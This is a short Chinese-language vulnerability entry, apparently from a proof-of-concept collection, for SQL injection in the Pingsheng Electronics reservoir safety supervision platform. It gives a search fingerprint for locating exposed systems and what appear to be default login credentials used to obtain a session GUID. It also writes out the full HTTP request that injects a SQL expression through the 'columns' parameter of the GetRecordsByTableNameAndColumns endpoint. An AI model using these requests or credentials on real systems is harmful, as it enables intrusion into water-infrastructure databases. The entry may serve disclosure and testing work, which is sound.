# 平升电子水库安全监管平台GetRecordsByTableNameAndColumns存在SQL注入漏洞

- **系统**：平升电子水库安全监管平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="js/PSExtend.js"`
- **请求**：`POST /Webservices/UserAdminService.asmx/Login HTTP/1.1`

**请求体 / payload**
```
首先获取Guid
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
LoginName=Data86&LoginPwd=Data86%40

替换获取的Guid发送数据包
POST /WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns HTTP/1.1
Host:
Content-Length: 105
Content-Type: application/x-www-form-urlencoded
loginIdentifer=07deec48-6ee8-4127-9b27-fda9ae2036f9&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)
```

**其他**
- 平升电子水库安全监管平台GetRecordsByTableNameAndColumns存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 平升电子水库安全监管平台